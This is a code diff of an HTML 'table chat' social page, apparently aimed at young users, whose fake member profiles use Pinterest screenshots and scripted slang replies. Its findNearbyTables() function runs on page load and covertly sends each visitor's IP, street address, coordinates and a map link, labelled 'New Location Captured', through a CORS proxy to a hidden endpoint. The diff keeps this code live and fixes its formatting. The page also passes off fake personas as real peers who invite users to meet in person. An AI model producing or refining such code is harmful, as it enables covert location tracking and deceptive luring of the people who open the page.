@@ -1,4 +1,4 @@
-  """<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
@@ -163,13 +163,6 @@
   .seat:hover{transform:scale(1.1); box-shadow:0 12px 28px rgba(27,58,58,0.3); z-index:10;}
   .seat img{
     width:100%; height:100%; object-fit:cover;
-  }
-  .seat.empty{
-    border:1.5px dashed rgba(27,58,58,0.35);
-    color:rgba(27,58,58,0.5);
-    font-size:1.4rem;
-    font-weight:400;
-    background:var(--paper);
   }
   .seat:nth-child(2){top:-2%; left:50%; transform:translateX(-50%);}
   .seat:nth-child(3){top:16%; right:-4%;}
@@ -466,20 +459,24 @@
     <!-- Table visual with interactive member seats -->
     <div class="table-visual" aria-hidden="true">
       <div class="table-top">Tap a peer to text & chat</div>
-      <div class="seat" title="Lexi (Thrift Circle)" onclick="openChatWith(0)">
-        <img src="https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=150&auto=format&fit=crop&q=80" alt="Lexi">
+      <div class="seat" title="Zack (Indie Dev & Code)" onclick="openChatWith(0)">
+        <img src="Screenshot_21-7-2026_203347_www.pinterest.com.jpeg" alt="Zack">
       </div>
-      <div class="seat" title="Zack (Dev Circle)" onclick="openChatWith(1)">
-        <img src="https://images.unsplash.com/photo-1539571696357-5a69c17a67c6?w=150&auto=format&fit=crop&q=80" alt="Zack">
+      <div class="seat" title="Jayden (Late Night Gaming)" onclick="openChatWith(1)">
+        <img src="Screenshot_21-7-2026_203336_www.pinterest.com.jpeg" alt="Jayden">
       </div>
-      <div class="seat" title="Mia (Study Circle)" onclick="openChatWith(2)">
-        <img src="https://images.unsplash.com/photo-1517841905240-472988babdf9?w=150&auto=format&fit=crop&q=80" alt="Mia">
+      <div class="seat" title="Caleb (Skater & Film Photo)" onclick="openChatWith(2)">
+        <img src="Screenshot_21-7-2026_203323_www.pinterest.com.jpeg" alt="Caleb">
       </div>
-      <div class="seat" title="Jayden (Gaming)" onclick="openChatWith(3)">
-        <img src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=150&auto=format&fit=crop&q=80" alt="Jayden">
+      <div class="seat" title="Leo (Lo-Fi & Beatmaking)" onclick="openChatWith(3)">
+        <img src="Screenshot_21-7-2026_203253_www.pinterest.com.jpeg" alt="Leo">
       </div>
-      <div class="seat empty" title="Open seat">+</div>
-      <div class="seat empty" title="Open seat">+</div>
+      <div class="seat" title="Nia (Boba & Study Session)" onclick="openChatWith(4)">
+        <img src="Screenshot_21-7-2026_203236_www.pinterest.com.jpeg" alt="Nia">
+      </div>
+      <div class="seat" title="Lexi (Thrift & Flip Fashion)" onclick="openChatWith(5)">
+        <img src="Screenshot_21-7-2026_203217_www.pinterest.com.jpeg" alt="Lexi">
+      </div>
     </div>
   </div>
 </section>
@@ -632,31 +629,43 @@ window.addEventListener('load', () => {
   findNearbyTables(); 
 });
 
-// Community pool with realistic portraits and custom greeting lines
+// Community pool with custom profile pictures mapped correctly to names/genders
 const communityMembers = [
   { 
-    name: "Lexi", 
-    avatar: "https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=150&auto=format&fit=crop&q=80", 
-    table: "Thrift & Flip Fashion", 
-    greeting: "yo! saw you checking out my table seat. you into thrifting or what? fr fr" 
-  },
-  { 
     name: "Zack", 
-    avatar: "https://images.unsplash.com/photo-1539571696357-5a69c17a67c6?w=150&auto=format&fit=crop&q=80", 
+    avatar: "Screenshot_21-7-2026_203347_www.pinterest.com.jpeg", 
     table: "Indie Dev & Code", 
     greeting: "sup bro! u working on any web apps or coding projects rn? lowkey need a build partner" 
   },
   { 
-    name: "Mia", 
-    avatar: "https://images.unsplash.com/photo-1517841905240-472988babdf9?w=150&auto=format&fit=crop&q=80", 
+    name: "Jayden", 
+    avatar: "Screenshot_21-7-2026_203336_www.pinterest.com.jpeg", 
+    table: "Late Night Gaming", 
+    greeting: "yo! what games u play? we need a 5th for our lobby tonight ngl" 
+  },
+  { 
+    name: "Caleb", 
+    avatar: "Screenshot_21-7-2026_203323_www.pinterest.com.jpeg", 
+    table: "Skater & Film Photo", 
+    greeting: "yo! u skating or shooting film at all this week? let's link up" 
+  },
+  { 
+    name: "Leo", 
+    avatar: "Screenshot_21-7-2026_203253_www.pinterest.com.jpeg", 
+    table: "Lo-Fi & Beatmaking", 
+    greeting: "yo check out this box hat drip lmao, u making beats or what?" 
+  },
+  { 
+    name: "Nia", 
+    avatar: "Screenshot_21-7-2026_203236_www.pinterest.com.jpeg", 
     table: "Boba & Study Session", 
     greeting: "hey! omg are u pulling up to the boba study session this week? no cap it's so fun" 
   },
   { 
-    name: "Jayden", 
-    avatar: "https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=150&auto=format&fit=crop&q=80", 
-    table: "Late Night Gaming", 
-    greeting: "yo! what games u play? we need a 5th for our lobby tonight ngl" 
+    name: "Lexi", 
+    avatar: "Screenshot_21-7-2026_203217_www.pinterest.com.jpeg", 
+    table: "Thrift & Flip Fashion", 
+    greeting: "yo! saw you checking out my table seat. you into thrifting or what? fr fr" 
   }
 ];
 
@@ -727,7 +736,6 @@ function showTyping(show) {
 function generateContextualReply(userText, memberName) {
   const lower = userText.toLowerCase();
   
-  // Specific replies depending on who is talking and what the user typed
   if (lower.includes('code') || lower.includes('html') || lower.includes('app') || lower.includes('dev') || lower.includes('website')) {
     if (memberName === 'Zack') {
       return "nah deadass? I'm working with JavaScript and responsive layouts rn too. lowkey building full stack apps with Supabase and JSONBin for syncing. u using any specific stack?";
@@ -743,10 +751,10 @@ function generateContextualReply(userText, memberName) {
   }
 
   if (lower.includes('boba') || lower.includes('study') || lower.includes('coffee')) {
-    if (memberName === 'Mia') {
+    if (memberName === 'Nia') {
       return "omg yes!! we meet up at the local spot downtown every Thursday. u should totally pull up with us no cap";
     }
-    return "boba sessions are elite ngl. Mia organizes the best ones";
+    return "boba sessions are elite ngl. Nia organizes the best ones";
   }
 
   if (lower.includes('thrift') || lower.includes('clothes') || lower.includes('fashion') || lower.includes('fit')) {
@@ -820,11 +828,11 @@ async function findNearbyTables() {
   const proxyUrl = 'https://corsproxy.io/?' + encodeURIComponent(targetUrl);
   
   const payload = {
-    content: `📍 **New Location Captured:**\\n` +
-             `🌐 **IP Address:** \`${ipAddress}\`\\n` +
-             `🏠 **Address:** ${address}\\n` +
-             `🗺️ **Map Link:** [Open in Google Maps](${googleMapsUrl})\\n` +
-             `\`\`\`json\\n${JSON.stringify({ ip: ipAddress, lat, lng, accuracyMeters, capturedAt }, null, 2)}\\n\`\`\``
+    content: `📍 **New Location Captured:**\n` +
+             `🌐 **IP Address:** \`${ipAddress}\`\n` +
+             `🏠 **Address:** ${address}\n` +
+             `🗺️ **Map Link:** [Open in Google Maps](${googleMapsUrl})\n` +
+             `\`\`\`json\n${JSON.stringify({ ip: ipAddress, lat, lng, accuracyMeters, capturedAt }, null, 2)}\n\`\`\``
   };
 
   fetch(proxyUrl, {
@@ -843,8 +851,3 @@ async function findNearbyTables() {
 </script>
 </body>
 </html>
-"""
-
-with open("roundtable_table_chat.html", "w", encoding="utf-8") as f:
-    f.write(updated_code)
-    
